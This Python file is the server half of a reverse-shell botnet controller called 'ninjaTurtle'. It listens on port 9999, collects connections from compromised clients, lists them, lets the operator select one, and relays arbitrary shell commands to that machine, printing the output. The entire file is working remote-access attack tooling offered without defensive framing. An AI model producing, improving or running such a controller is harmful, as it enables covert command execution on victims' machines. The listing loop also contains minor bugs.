import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]  # first thread handles listening/accepting and second thread handles commands
queue = Queue()
all_connections = []
all_address = []



# create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("socket creation error" + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("binding the port " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("socket binding error" + str(msg) + "\n" + "retrying...")
        bind_socket()


# Handling connections from multiple clients and saving to our lists
# Closing previous connections when server.py file is starting


def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # To prevent timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established: " + address[0])

        except Exception:
            print("Error accepting connections")


# 2nd thread functions: (1)See all clients (2)Select a client (3)Send commands to the connected client
# Interactive prompt for sending commands
# ninjaTurtle> list
# 0 client-A    port
# 1 client-B    port
# 2 client-C    port
# ninjaTurtle> select 1
# 192.168.0.4>


def start_ninja_turtle():
    while True:
        cmd = input('ninjaTurtle>')
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections

def list_connections():
    results = ''

    select_id = 0
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except Exception:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "    " + str(all_address[i][0]) + "    " + str(all_address[i][1]) + "\n"

        print("~~~Clients~~~" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")  # e.g. 192.168.0.4>
        return conn

    except Exception:
        print("Selection not valid")
        return None


# Send command to client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except Exception:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_ninja_turtle()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
